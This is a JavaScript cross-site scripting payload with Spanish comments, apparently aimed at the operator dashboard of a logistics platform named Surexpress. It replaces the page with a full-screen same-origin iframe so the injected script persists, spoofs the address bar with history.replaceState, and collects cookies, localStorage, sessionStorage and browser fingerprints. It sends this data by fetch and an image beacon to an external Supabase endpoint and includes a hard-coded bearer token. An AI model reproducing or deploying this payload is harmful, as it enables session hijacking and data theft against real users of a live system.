// =============================================
// ESTRATEGIA: IFRAME INMEDIATO + SEPARACIÓN DE CONTEXTOS
// =============================================

// Verificar contexto inmediatamente
if (window.self !== window.top) {
    // ESTAMOS EN IFRAME - Solo simulación de rutas
    console.log('🔄 IFRAME CONTEXT - Route simulation only');
    setupIframeRouteSimulation();
} else if (!window.__MAIN_XSS_EXECUTED__) {
    // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
    window.__MAIN_XSS_EXECUTED__ = true;
    executeMainXSS();
}

// =============================================
// PÁGINA PRINCIPAL: IFRAME INMEDIATO + TU FINGERPRINTING
// =============================================
function executeMainXSS() {
    'use strict';
    
    console.log('🚀 MAIN PAGE - Creating iframe immediately');
    
    // 1. CREAR IFRAME INMEDIATAMENTE (ANTES DE NADA)
    function createIframeFirst() {
        try {
            // Asegurar que el body existe
            if (!document.body) {
                setTimeout(createIframeFirst, 50);
                return;
            }
            
            // Crear iframe inmediatamente
            const iframe = document.createElement('iframe');
            iframe.src = window.location.href;
            iframe.style.cssText = `
                width: 100% !important;
                height: 100% !important;
                border: none !important;
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                z-index: 99999 !important;
                margin: 0 !important;
                padding: 0 !important;
                background: white !important;
            `;
            iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals');
            
            // Limpiar TODO y poner solo el iframe
            document.body.innerHTML = '';
            document.body.style.overflow = 'hidden';
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.appendChild(iframe);
            
            console.log('✅ Iframe created successfully');
            
            // 2. CONFIGURAR SISTEMA DE RUTAS DESPUÉS DEL IFRAME
            setupRouteSystem(iframe);
            
            // 3. FINGERPRINTING COMPLETO DESPUÉS DEL IFRAME
            executeFullFingerprinting();
            
        } catch(e) {
            console.log('❌ Iframe creation failed:', e);
            setTimeout(createIframeFirst, 100);
        }
    }
    
    // 2. SISTEMA DE SIMULACIÓN DE RUTAS
    function setupRouteSystem(iframe) {
        let currentPath = window.location.pathname;
        
        function updateBrowserURL(path) {
            currentPath = path;
            window.history.replaceState({}, '', path);
            document.title = 'Surexpress | ' + getPageTitle(path);
        }
        
        function getPageTitle(path) {
            const titles = {
                '/Operator/Dashboard_M/': 'Dashboard',
                '/Operator/Orders/': 'Órdenes', 
                '/Operator/Usuarios/': 'Usuarios',
                '/Operator/Clientes/': 'Clientes',
                '/Operator/Agencias/': 'Agencias',
                '/Operator/Monitor/': 'Monitor',
                '/Operator/GuiasAereas/': 'Guías Aéreas',
                '/Operator/Billing/': 'Facturación',
                '/Operator/Revision/': 'Revisiones',
                '/Operator/incidenciaHouse/': 'Incidencias'
            };
            return titles[path] || 'Sistema';
        }
        
        // Escuchar mensajes del iframe para cambios de URL
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'URL_CHANGE') {
                console.log('🔄 URL change detected:', event.data.url);
                updateBrowserURL(event.data.url);
            }
        });
        
        // Manejar botones atrás/adelante
        window.addEventListener('popstate', function() {
            const newPath = window.location.pathname + window.location.search;
            console.log('🔙 Browser navigation:', newPath);
            iframe.src = newPath;
        });
        
        console.log('✅ Route system ready');
    }
    
    // 3. FINGERPRINTING COMPLETO (TU CÓDIGO ORIGINAL)
    function executeFullFingerprinting() {
        try {
            var d = {
                timestamp: new Date().toISOString(),
                url: location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: JSON.stringify(navigator.languages),
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                screen: JSON.stringify({
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                }),
                browser: JSON.stringify({
                    vendor: navigator.vendor,
                    product: navigator.product
                }),
                connection: JSON.stringify(navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                } : 'N/A'),
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency,
                plugins: JSON.stringify(Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename
                }))),
                fonts: JSON.stringify(['Arial','Times New Roman','Verdana','Georgia']
                    .filter(f => document.fonts.check('12px "' + f + '"'))),
                canvasFingerprint: (function(){
                    var c = document.createElement('canvas'),
                        ctx = c.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125,1,62,20);
                    ctx.fillStyle = '#069';
                    ctx.fillText('FP',2,15);
                    return c.toDataURL();
                })(),
                historyLength: history.length,
                forms: JSON.stringify(Array.from(document.forms).map(f => ({
                    action: f.action,
                    method: f.method
                }))),
                links: JSON.stringify(Array.from(document.links).slice(0,5).map(l => ({
                    href: l.href
                }))),
                attackPhase: 'main_with_iframe'
            };
            
            // Enviar datos via fetch (TU ENDPOINT)
            fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
                },
                body: JSON.stringify({fingerprint: d})
            });
            
            // Backup via imagen (TU BACKUP)
            var i = new Image();
            i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                    btoa(JSON.stringify(d)).substring(0,1500);
                    
            console.log('✅ Full fingerprinting completed');
            
        } catch(e) {
            console.log('❌ Full fingerprinting failed:', e);
        }
    }
    
    // INICIAR TODO - IFRAME PRIMERO
    createIframeFirst();
}

// =============================================
// IFRAME: SOLO SIMULACIÓN DE RUTAS
// =============================================
function setupIframeRouteSimulation() {
    'use strict';
    
    // Evitar ejecución múltiple en el mismo iframe
    if (window.__IFRAME_ROUTES_ACTIVE__) {
        return;
    }
    window.__IFRAME_ROUTES_ACTIVE__ = true;
    
    console.log('🎯 IFRAME - Setting up route simulation');
    
    // A. INTERCEPTAR HISTORY API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function(state, title, url) {
        if (url && window.parent) {
            const urlStr = typeof url === 'string' ? url : url.toString();
            window.parent.postMessage({
                type: 'URL_CHANGE',
                url: urlStr,
                action: 'push'
            }, '*');
        }
        return originalPushState.apply(this, arguments);
    };
    
    history.replaceState = function(state, title, url) {
        if (url && window.parent) {
            const urlStr = typeof url === 'string' ? url : url.toString();
            window.parent.postMessage({
                type: 'URL_CHANGE', 
                url: urlStr,
                action: 'replace'
            }, '*');
        }
        return originalReplaceState.apply(this, arguments);
    };
    
    // B. INTERCEPTAR CLICKS EN ENLACES
    document.addEventListener('click', function(e) {
        let target = e.target;
        while (target && target.tagName !== 'A') {
            target = target.parentElement;
        }
        
        if (target && target.href && target.href.includes('/Operator/')) {
            e.preventDefault();
            
            const url = new URL(target.href);
            const path = url.pathname + url.search;
            
            // Navegar dentro del iframe
            window.location.href = target.href;
            
            // Notificar al padre inmediatamente
            if (window.parent) {
                window.parent.postMessage({
                    type: 'URL_CHANGE',
                    url: path,
                    action: 'click'
                }, '*');
            }
        }
    });
    
    // C. DETECTOR AUTOMÁTICO DE CAMBIOS DE RUTA
    let lastPath = window.location.pathname + window.location.search;
    
    setInterval(() => {
        const currentPath = window.location.pathname + window.location.search;
        if (currentPath !== lastPath) {
            lastPath = currentPath;
            
            if (window.parent) {
                window.parent.postMessage({
                    type: 'URL_CHANGE',
                    url: currentPath,
                    action: 'auto'
                }, '*');
            }
        }
    }, 250);
    
    // D. INTERCEPTAR FORMULARIOS
    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (form.action && form.action.includes('/Operator/')) {
            setTimeout(() => {
                const currentPath = window.location.pathname + window.location.search;
                if (window.parent) {
                    window.parent.postMessage({
                        type: 'URL_CHANGE',
                        url: currentPath,
                        action: 'form'
                    }, '*');
                }
            }, 500);
        }
    });
    
    // Notificar ruta inicial después de un breve delay
    setTimeout(() => {
        if (window.parent) {
            const currentPath = window.location.pathname + window.location.search;
            window.parent.postMessage({
                type: 'URL_CHANGE',
                url: currentPath,
                action: 'initial'
            }, '*');
        }
    }, 300);
    
    console.log('✅ Iframe route simulation active');
}
